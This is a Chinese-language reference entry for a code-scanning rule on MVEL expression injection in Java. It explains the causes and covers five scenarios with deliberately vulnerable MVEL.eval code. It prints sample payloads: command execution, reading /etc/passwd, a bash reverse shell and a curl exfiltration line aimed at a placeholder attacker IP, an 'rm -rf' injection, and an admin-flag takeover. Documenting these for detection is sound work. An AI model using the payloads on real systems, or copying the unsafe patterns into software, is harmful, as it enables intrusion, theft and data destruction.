# MVEL表达式注入漏洞 完整描述

> 规则 ID：`any_mvel_codei` · 类别：codei · 关键 sink：MVEL, eval
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## MVEL表达式注入漏洞 完整描述
MVEL（MVFLEX Expression Language）是一种基于Java的动态脚本表达式语言，兼具表达式解析和简单脚本编程能力，广泛应用于各类Java应用（如规则引擎、配置解析、动态逻辑执行场景）中。MVEL表达式注入漏洞，本质是**攻击者通过可控输入点向应用传入恶意MVEL表达式**，应用未对输入做有效校验/过滤便直接执行该表达式，导致攻击者可执行任意代码、读取/修改敏感数据、控制应用逻辑，甚至获取服务器权限的严重安全问题。

## 一、漏洞核心成因
MVEL设计初衷是简化Java应用的动态逻辑编写，其表达式执行引擎支持直接调用Java类、方法、访问系统API，且默认未对执行权限做严格限制。当应用满足以下条件时，就会触发注入漏洞：
1. **输入可控**：攻击者能修改传入MVEL解析器的表达式内容（如通过HTTP参数、配置文件、表单输入等）；
2. **无校验执行**：应用直接将可控输入拼接/传入`MVEL.eval()`、`MVEL.executeExpression()`等核心执行方法，未对表达式内容、调用的类/方法做任何过滤或权限限制；
3. **执行权限过高**：MVEL执行上下文使用高权限JVM进程（如Tomcat的`catalina`用户、root权限），导致注入的恶意代码能执行敏感操作。

## 二、MVEL表达式的执行特性（漏洞放大因素）
MVEL的语法灵活性是漏洞的重要前提，其核心特性包括：
- 支持直接调用Java类：如`java.lang.Runtime.getRuntime().exec("whoami")`可直接执行系统命令；
- 支持简化语法：省略`new`关键字、直接访问静态方法（如`Runtime.getRuntime().exec(...)`）；
- 支持访问上下文变量：若执行上下文暴露了`request`、`session`、`database`等敏感对象，攻击者可直接操作；
- 支持循环、条件判断等脚本逻辑：可编写复杂恶意代码（如文件遍历、数据窃取）；
- 无默认沙箱：MVEL原生未提供安全沙箱，除非开发者手动限制，否则表达式可调用任意Java API。

## 三、漏洞的不同触发场景
### 场景1：直接表达式注入（最常见）
应用将用户输入直接作为MVEL表达式执行，无任何过滤。
#### 示例代码（漏洞代码）：
```java
// 从HTTP请求中获取用户可控的表达式参数
String userInput = request.getParameter("expr");
// 直接执行用户输入的MVEL表达式
Object result = MVEL.eval(userInput);
// 将结果返回给用户（放大危害）
response.getWriter().write(result.toString());
```
#### 攻击Payload示例：
- 执行系统命令：`java.lang.Runtime.getRuntime().exec("ls /")`；
- 读取敏感文件：`new java.io.FileReader("/etc/passwd").read()`；
- 访问应用上下文：`ctx.getBean("userService").getAllUsers()`（若上下文暴露`ctx`对象）；
- 反弹Shell：`java.lang.Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/攻击者IP/端口 0>&1'")`。

### 场景2：表达式拼接注入
应用未直接使用用户输入作为表达式，但将用户输入拼接进MVEL表达式模板中执行，攻击者通过拼接突破原有逻辑。
#### 示例代码（漏洞代码）：
```java
// 业务逻辑：根据用户输入的"userId"查询用户，拼接MVEL表达式
String userId = request.getParameter("userId");
String mvelExpr = "userService.getUserById(" + userId + ")";
// 执行拼接后的表达式
Object user = MVEL.eval(mvelExpr, context);
```
#### 攻击Payload示例：
攻击者传入`userId`参数为：`1); java.lang.Runtime.getRuntime().exec("rm -rf /tmp/*"); //`
拼接后的表达式变为：
`userService.getUserById(1); java.lang.Runtime.getRuntime().exec("rm -rf /tmp/*"); //")`
MVEL执行时会先执行查询，再执行恶意命令（注释符屏蔽后续无效代码）。

### 场景3：上下文变量劫持注入
MVEL执行时会传入包含应用上下文的变量（如`request`、`session`、`springContext`等），攻击者通过表达式修改/访问这些变量，实现越权或敏感操作。
#### 示例场景：
应用将`User`对象传入MVEL上下文，用于动态判断用户权限：
```java
User currentUser = (User) session.getAttribute("currentUser");
Map<String, Object> context = new HashMap<>();
context.put("user", currentUser);
// 执行用户可控的权限判断表达式
boolean hasPermission = (boolean) MVEL.eval(permissionExpr, context);
```
#### 攻击Payload：
攻击者传入`permissionExpr`为：`user.setAdmin(true); true`
执行后，当前用户被修改为管理员，实现越权。

### 场景4：嵌套/间接表达式注入
MVEL支持表达式嵌套执行（如通过`MVEL.eval()`在表达式中再次调用执行方法），或应用通过多层解析（如先解析配置，再执行其中的MVEL表达式）导致间接注入。
#### 示例代码：
```java
// 从配置文件读取表达式模板（配置内容可控）
String configExpr = configService.getConfig("dynamic_rule");
// 替换模板中的变量（变量值来自用户输入）
String finalExpr = String.format(configExpr, request.getParameter("param"));
// 执行最终表达式
MVEL.eval(finalExpr);
```
#### 攻击逻辑：
若配置模板为`user.check(%s)`，攻击者传入`param`为`1; Runtime.getRuntime().exec("id")`，最终表达式变为`user.check(1; Runtime.getRuntime().exec("id"))`，触发命令执行。

### 场景5：MVEL 2.x 特殊语法注入
MVEL 2.x新增了更灵活的语法（如属性访问、方法链式调用、Lambda表达式），进一步降低了攻击门槛：
- 简化类调用：`Runtime.runtime.exec("whoami")`（省略`getRuntime()`和`java.lang`包名）；
- Lambda表达式结合命令执行：`() -> { Runtime.getRuntime().exec("curl 攻击者IP/leak?data=" + new File("/etc/passwd").read()) }`；
- 静态导入调用：`import static java.lang.Runtime.*; getRuntime().exec("uname -a")`。

## 四、漏洞的危害等级与影响范围
### 危害等级：
属于**高危/严重**级别，根据执行上下文权限不同，可能导致：
1. 任意代码执行（远程命令执行RCE）；
2. 敏感数据泄露（读取配置文件、数据库凭证、用户数据）；
3. 权限提升（修改用户角色、操作权限）；
4. 应用逻辑篡改（绕过认证、修改业务规则）；
5. 服务器接管（通过RCE植入后门、控制服务器）。

### 影响范围：
所有使用MVEL解析用户可控输入的Java应用，常见于：
- 规则引擎（如Drools、JBoss Rules）；
- 低代码平台、工作流引擎；
- 配置动态解析的Java Web应用；
- 基于Spring/Struts等框架的自定义动态逻辑模块。

## 五、易混淆的边界场景（非漏洞但易误判）
需注意以下场景不属于MVEL注入，但易被混淆：
1. 输入仅作为表达式的静态值（如表达式为`"name == '" + userInput + "'"`，但用户输入被转义为字符串常量，无法执行代码）；
2. MVEL仅用于纯数据计算（如`a + b`），且输入仅为数字/字符串常量，无类/方法调用；
3. 应用通过自定义ClassLoader或安全管理器严格限制了MVEL可调用的类/方法（此时即使注入表达式，也无法执行敏感操作）。

综上，MVEL表达式注入的核心风险在于“可控输入+无限制执行”的组合，不同场景的本质差异仅在于输入进入表达式的方式、执行上下文的权限，以及是否利用了MVEL的语法特性，但最终都指向攻击者可通过恶意表达式接管应用执行逻辑。

